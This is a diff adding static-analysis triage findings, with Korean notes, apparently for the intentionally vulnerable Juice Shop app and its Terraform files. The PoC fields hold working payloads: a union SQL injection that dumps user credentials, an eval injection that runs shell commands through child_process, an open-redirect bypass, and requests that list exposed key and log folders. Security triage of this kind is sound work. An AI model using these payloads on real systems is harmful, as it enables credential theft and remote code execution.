+      "rationale": "quarantine sendFile 에 동일한 `!file.includes('/')` 가드.",
+      "evidence": "if (!file.includes('/')) { res.sendFile(path.resolve('ftp/quarantine/', file)) }",
+      "suggested_fix": "정규화 + 접두 검증.",
+      "triage_note": "F030/F031처럼 완화됨.",
+      "poc": "슬래시 가드가 이탈 차단; ftp/quarantine/ 에만 한정."
+    }
+  },
+  {
+    "id": "F034",
+    "rule": "express-open-redirect",
+    "full_rule": "javascript.express.security.audit.express-open-redirect.express-open-redirect",
+    "path": "routes/redirect.ts",
+    "line": 18,
+    "endline": 18,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+    ],
+    "owasp": [
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "The application redirects to a URL specified by user-supplied input `query` that is not validated. This could redirect users to malicious locations. Consider using an allow-list approach to validate URLs, or warn users they are being redirected to a third-party website.",
+    "code": "  14|     const toUrl: string = query.to as string\n  15|     if (security.isRedirectAllowed(toUrl)) {\n  16|       challengeUtils.solveIf(challenges.redirectCryptoCurrencyChallenge, () => { return toUrl === 'https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW' || toUrl === 'https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm' || toUrl === 'https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6' })\n  17|       challengeUtils.solveIf(challenges.redirectChallenge, () => { return isUnintendedRedirect(toUrl) })\n  18|       res.redirect(toUrl)\n  19|     } else {\n  20|       res.status(406)\n  21|       next(new Error('Unrecognized target URL for redirect: ' + toUrl))\n  22|     }",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.7,
+      "exploitability": "MEDIUM",
+      "reachable": "true",
+      "priority": "P2",
+      "category": "open-redirect",
+      "rationale": "res.redirect(toUrl) 가 isRedirectAllowed 로 가드되지만, 그 검사는 부분문자열 기반이라 우회 가능 (예: ?to=https://evil?x=<허용URL>).",
+      "evidence": "if (security.isRedirectAllowed(toUrl)) { res.redirect(toUrl) }",
+      "suggested_fix": "부분문자열 포함이 아니라 호스트 정확 허용목록으로 검증.",
+      "triage_note": "가드는 있으나 약함 — 의도된 오픈리다이렉트 챌린지; 우회 기법 필요.",
+      "poc": "허용목록이 부분문자열 기반 → 허용 URL 을 쿼리 파라미터로 넣어 우회:\n  GET /redirect?to=https://evil.example/?ref=https://github.com/juice-shop/juice-shop"
+    }
+  },
+  {
+    "id": "F035",
+    "rule": "express-sequelize-injection",
+    "full_rule": "javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+    "path": "routes/search.ts",
+    "line": 23,
+    "endline": 23,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements.",
+    "code": "  19| export function searchProducts () {\n  20|   return (req: Request, res: Response, next: NextFunction) => {\n  21|     let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''\n  22|     criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)\n  23|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge\n  24|       .then(([products]: any) => {\n  25|         const dataString = JSON.stringify(products)\n  26|         if (challengeUtils.notSolved(challenges.unionSqlInjectionChallenge)) { // vuln-code-snippet hide-start\n  27|           let solved = true",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.97,
+      "exploitability": "HIGH",
+      "reachable": "true",
+      "priority": "P1",
+      "category": "sql-injection",
+      "rationale": "req.query.q 가 템플릿 리터럴로 원시 Sequelize 쿼리에 흘러들어감, 파라미터화 없음 — 라이브 상품검색 union SQLi.",
+      "evidence": "sequelize.query(`... LIKE '%${criteria}%' ...`), criteria = req.query.q",
+      "suggested_fix": "검색어 파라미터화.",
+      "triage_note": "라이브 라우트(routes/search.ts); F015/F023/F024 코드픽스 스니펫의 도달 가능 버전.",
+      "poc": "상품 검색의 union 기반 SQLi:\n  GET /rest/products/search?q=qwert'))--                 (주입 확인)\n  GET /rest/products/search?q=qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--   (자격증명 덤프)"
+    }
+  },
+  {
+    "id": "F036",
+    "rule": "code-string-concat",
+    "full_rule": "javascript.lang.security.audit.code-string-concat.code-string-concat",
+    "path": "routes/userProfile.ts",
+    "line": 65,
+    "endline": 65,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+    ],
+    "owasp": [
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Found data from an Express or Next web request flowing to `eval`. If this data is user-controllable this can lead to execution of arbitrary system commands in the context of your application process. Avoid `eval` whenever possible.",
+    "code": "  61|         try {\n  62|           if (!code) {\n  63|             throw new Error('Username is null')\n  64|           }\n  65|           username = eval(code) // eslint-disable-line no-eval\n  66|         } catch (err) {\n  67|           username = '\\\\' + username\n  68|         }\n  69|       } else {",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.95,
+      "exploitability": "HIGH",
+      "reachable": "true",
+      "priority": "P1",
+      "category": "code-injection",
+      "rationale": "사용자 영향 하의 code 가 사용자 프로필 핸들러의 eval() 로 전달 → 임의 코드 실행/SSTI.",
+      "evidence": "username = eval(code)",
+      "suggested_fix": "eval 제거; 기대값을 명시적으로 파싱/화이트리스트.",
+      "triage_note": "Juice Shop SSTI/eval 챌린지 — 앱 프로세스 컨텍스트에서 RCE.",
+      "poc": "프로필 username 을 통한 서버측 템플릿/eval 주입:\n  username 을  #{7*7}  로 설정                              → 49 렌더(eval 확인)\n  RCE:  #{global.process.mainModule.require('child_process').execSync('id')}"
+    }
+  },
+  {
+    "id": "F037",
+    "rule": "express-check-directory-listing",
+    "full_rule": "javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing",
+    "path": "server.ts",
+    "line": 268,
+    "endline": 268,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-548: Exposure of Information Through Directory Listing"
+    ],
+    "owasp": [
+      "A06:2017 - Security Misconfiguration",
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource.",
+    "code": " 264|     next()\n 265|   }\n 266| \n 267|   /* /infrastructure directory browsing */\n 268|   app.use('/infrastructure', serveIndexMiddleware, serveIndex('infrastructure', { icons: true, view: 'details', filter: (filename) => filename !== 'README.md' }))\n 269|   app.use('/infrastructure', verify.accessControlChallenges())\n 270|   app.use('/infrastructure', (req: Request, res: Response, next: NextFunction) => {\n 271|     const filePath = path.resolve('infrastructure', path.normalize(req.path).replace(/^[\\\\/]+/, ''))\n 272|     if (!filePath.startsWith(path.resolve('infrastructure')) || filePath.endsWith('README.md')) {",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.85,
+      "exploitability": "MEDIUM",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "info-disclosure",
+      "rationale": "serveIndex 로 /infrastructure 디렉터리 브라우징 활성화.",
+      "evidence": "app.use('/infrastructure', serveIndexMiddleware, serveIndex('infrastructure', ...))",
+      "suggested_fix": "디렉터리 리스팅 비활성화; 명시 파일만 서빙.",
+      "triage_note": "뒤에 접근제어 미들웨어 존재 — 부분 완화; 커버리지 확인 필요.",
+      "poc": "GET /infrastructure   → infrastructure 폴더 디렉터리 리스팅."
+    }
+  },
+  {
+    "id": "F038",
+    "rule": "express-check-directory-listing",
+    "full_rule": "javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing",
+    "path": "server.ts",
+    "line": 288,
+    "endline": 288,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-548: Exposure of Information Through Directory Listing"
+    ],
+    "owasp": [
+      "A06:2017 - Security Misconfiguration",
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource.",
+    "code": " 284|   })\n 285| \n 286|   // vuln-code-snippet start directoryListingChallenge accessLogDisclosureChallenge\n 287|   /* /ftp directory browsing and file download */ // vuln-code-snippet neutral-line directoryListingChallenge\n 288|   app.use('/ftp', serveIndexMiddleware, serveIndex('ftp', { icons: true })) // vuln-code-snippet vuln-line directoryListingChallenge\n 289|   app.use('/ftp(?!/quarantine)/:file', servePublicFiles()) // vuln-code-snippet vuln-line directoryListingChallenge\n 290|   app.use('/ftp/quarantine/:file', serveQuarantineFiles()) // vuln-code-snippet neutral-line directoryListingChallenge\n 291| \n 292|   app.use('/.well-known', serveIndexMiddleware, serveIndex('.well-known', { icons: true, view: 'details' }))",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.85,
+      "exploitability": "MEDIUM",
+      "reachable": "true",
+      "priority": "P2",
+      "category": "info-disclosure",
+      "rationale": "다운로드 가능한 민감 파일이 있는 /ftp 에 디렉터리 브라우징 활성화.",
+      "evidence": "serveIndex('ftp', { icons: true })",
+      "suggested_fix": "리스팅 비활성화; 민감 파일 접근 통제.",
+      "triage_note": "의도된 디렉터리 리스팅 챌린지; /ftp 는 민감 산출물 노출.",
+      "poc": "GET /ftp   → 디렉터리 리스팅; 노출 파일 다운로드(쿠폰, 백업, 이스터에그)."
+    }
+  },
+  {
+    "id": "F039",
+    "rule": "express-check-directory-listing",
+    "full_rule": "javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing",
+    "path": "server.ts",
+    "line": 292,
+    "endline": 292,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-548: Exposure of Information Through Directory Listing"
+    ],
+    "owasp": [
+      "A06:2017 - Security Misconfiguration",
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource.",
+    "code": " 288|   app.use('/ftp', serveIndexMiddleware, serveIndex('ftp', { icons: true })) // vuln-code-snippet vuln-line directoryListingChallenge\n 289|   app.use('/ftp(?!/quarantine)/:file', servePublicFiles()) // vuln-code-snippet vuln-line directoryListingChallenge\n 290|   app.use('/ftp/quarantine/:file', serveQuarantineFiles()) // vuln-code-snippet neutral-line directoryListingChallenge\n 291| \n 292|   app.use('/.well-known', serveIndexMiddleware, serveIndex('.well-known', { icons: true, view: 'details' }))\n 293|   app.use('/.well-known', express.static('.well-known'))\n 294| \n 295|   /* /encryptionkeys directory browsing */\n 296|   app.use('/encryptionkeys', serveIndexMiddleware, serveIndex('encryptionkeys', { icons: true, view: 'details' }))",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.8,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P4",
+      "category": "info-disclosure",
+      "rationale": "/.well-known 에 디렉터리 브라우징.",
+      "evidence": "serveIndex('.well-known', ...)",
+      "suggested_fix": "리스팅 비활성화.",
+      "triage_note": "민감도 낮은 디렉터리.",
+      "poc": "GET /.well-known   → 디렉터리 리스팅."
+    }
+  },
+  {
+    "id": "F040",
+    "rule": "express-check-directory-listing",
+    "full_rule": "javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing",
+    "path": "server.ts",
+    "line": 296,
+    "endline": 296,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-548: Exposure of Information Through Directory Listing"
+    ],
+    "owasp": [
+      "A06:2017 - Security Misconfiguration",
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource.",
+    "code": " 292|   app.use('/.well-known', serveIndexMiddleware, serveIndex('.well-known', { icons: true, view: 'details' }))\n 293|   app.use('/.well-known', express.static('.well-known'))\n 294| \n 295|   /* /encryptionkeys directory browsing */\n 296|   app.use('/encryptionkeys', serveIndexMiddleware, serveIndex('encryptionkeys', { icons: true, view: 'details' }))\n 297|   app.use('/encryptionkeys/:file', serveKeyFiles())\n 298| \n 299|   /* /logs directory browsing */ // vuln-code-snippet neutral-line accessLogDisclosureChallenge\n 300|   app.use('/support/logs', serveIndexMiddleware, serveIndex('logs', { icons: true, view: 'details' })) // vuln-code-snippet vuln-line accessLogDisclosureChallenge",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.85,
+      "exploitability": "MEDIUM",
+      "reachable": "true",
+      "priority": "P2",
+      "category": "info-disclosure",
+      "rationale": "키 자료 파일을 나열하는 /encryptionkeys 에 디렉터리 브라우징.",
+      "evidence": "serveIndex('encryptionkeys', ...)",
+      "suggested_fix": "리스팅 비활성화; 키 디렉터리 절대 노출 금지.",
+      "triage_note": "영향 큼 — 암호화 키 파일을 열거.",
+      "poc": "GET /encryptionkeys   → 키 자료 파일 나열(이후 개별 파일 획득)."
+    }
+  },
+  {
+    "id": "F041",
+    "rule": "express-check-directory-listing",
+    "full_rule": "javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing",
+    "path": "server.ts",
+    "line": 300,
+    "endline": 300,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-548: Exposure of Information Through Directory Listing"
+    ],
+    "owasp": [
+      "A06:2017 - Security Misconfiguration",
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource.",
+    "code": " 296|   app.use('/encryptionkeys', serveIndexMiddleware, serveIndex('encryptionkeys', { icons: true, view: 'details' }))\n 297|   app.use('/encryptionkeys/:file', serveKeyFiles())\n 298| \n 299|   /* /logs directory browsing */ // vuln-code-snippet neutral-line accessLogDisclosureChallenge\n 300|   app.use('/support/logs', serveIndexMiddleware, serveIndex('logs', { icons: true, view: 'details' })) // vuln-code-snippet vuln-line accessLogDisclosureChallenge\n 301|   app.use('/support/logs', verify.accessControlChallenges()) // vuln-code-snippet hide-line\n 302|   app.use('/support/logs/:file', serveLogFiles()) // vuln-code-snippet vuln-line accessLogDisclosureChallenge\n 303| \n 304|   /* Swagger documentation for B2B v2 endpoints */",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.85,
+      "exploitability": "MEDIUM",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "info-disclosure",
+      "rationale": "/support/logs 에 디렉터리 브라우징 → 접근로그 노출.",
+      "evidence": "serveIndex('logs', ...)",
+      "suggested_fix": "리스팅 비활성화; 로그 접근 제한.",
+      "triage_note": "접근로그 노출 챌린지; 뒤에 접근제어 미들웨어.",
+      "poc": "GET /support/logs   → 접근로그 노출(로그 디렉터리 리스팅)."
+    }
+  },
+  {
+    "id": "F042",
+    "rule": "aws-subnet-has-public-ip-address",
+    "full_rule": "terraform.aws.security.aws-subnet-has-public-ip-address.aws-subnet-has-public-ip-address",
+    "path": "terraform/networking.tf",
+    "line": 18,
+    "endline": 30,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1220: Insufficient Granularity of Access Control"
+    ],
+    "owasp": [
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Resources in the AWS subnet are assigned a public IP address. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application. Set `map_public_ip_on_launch` to false so that resources are not publicly-accessible.",
+    "code": "  14|     Environment = var.environment\n  15|   }\n  16| }\n  17| \n  18| resource \"aws_subnet\" \"public\" {\n  19|   count                   = length(var.public_subnet_cidrs)\n  20|   vpc_id                  = aws_vpc.main.id\n  21|   cidr_block              = var.public_subnet_cidrs[count.index]\n  22|   availability_zone       = data.aws_availability_zones.available.names[count.index]\n  23|   map_public_ip_on_launch = true\n  24| \n  25|   tags = {\n  26|     Name        = \"${var.project_name}-public-${count.index}\"\n  27|     Project     = var.project_name\n  28|     Environment = var.environment\n  29|   }\n  30| }\n  31| \n  32| resource \"aws_internet_gateway\" \"main\" {\n  33|   vpc_id = aws_vpc.main.id\n  34| ",
+    "triage": {
+      "verdict": "FALSE_POSITIVE",
+      "confidence": 0.75,
+      "exploitability": "NONE",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "iac-misconfig",
+      "rationale": "terraform/networking.tf 의 의도적 'public' 서브넷.",
+      "evidence": "\"public\" 서브넷, map_public_ip_on_launch = true",
+      "suggested_fix": "의도된 것이면 조치 불필요.",
+      "triage_note": "설계상 퍼블릭 서브넷(중복 인프라 트리).",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F043",
+    "rule": "insecure-load-balancer-tls-version",
+    "full_rule": "terraform.aws.security.insecure-load-balancer-tls-version.insecure-load-balancer-tls-version",
+    "path": "terraform/networking.tf",
+    "line": 160,
+    "endline": 160,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-326: Inadequate Encryption Strength"
+    ],
+    "owasp": [
+      "A03:2017 - Sensitive Data Exposure",
+      "A02:2021 - Cryptographic Failures",
+      "A04:2025 - Cryptographic Failures"
+    ],
+    "message": "Detected an AWS load balancer with an insecure TLS version. TLS versions less than 1.2 are considered insecure because they can be broken. To fix this, set your `ssl_policy` to `\"ELBSecurityPolicy-TLS13-1-2-Res-2021-06\"`, or include a default action to redirect to HTTPS.",
+    "code": " 156| \n 157| resource \"aws_lb_listener\" \"http\" {\n 158|   load_balancer_arn = aws_lb.juice_shop.arn\n 159|   port              = 80\n 160|   protocol          = \"HTTP\"\n 161| \n 162|   default_action {\n 163|     type             = \"forward\"\n 164|     target_group_arn = aws_lb_target_group.juice_shop.arn",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "MEDIUM",
+      "reachable": "unknown",
+      "priority": "P3",
+      "category": "iac-misconfig",
+      "rationale": "terraform/networking.tf 의 HTTP:80 forward 리스너.",
+      "evidence": "port=80 protocol=\"HTTP\" type=\"forward\"",
+      "suggested_fix": "80→443 리다이렉트.",
+      "triage_note": "리다이렉트 의도 확인 필요.",
+      "poc": "평문 HTTP:80 리스너 → 도청/MITM."
+    }
+  }
+]
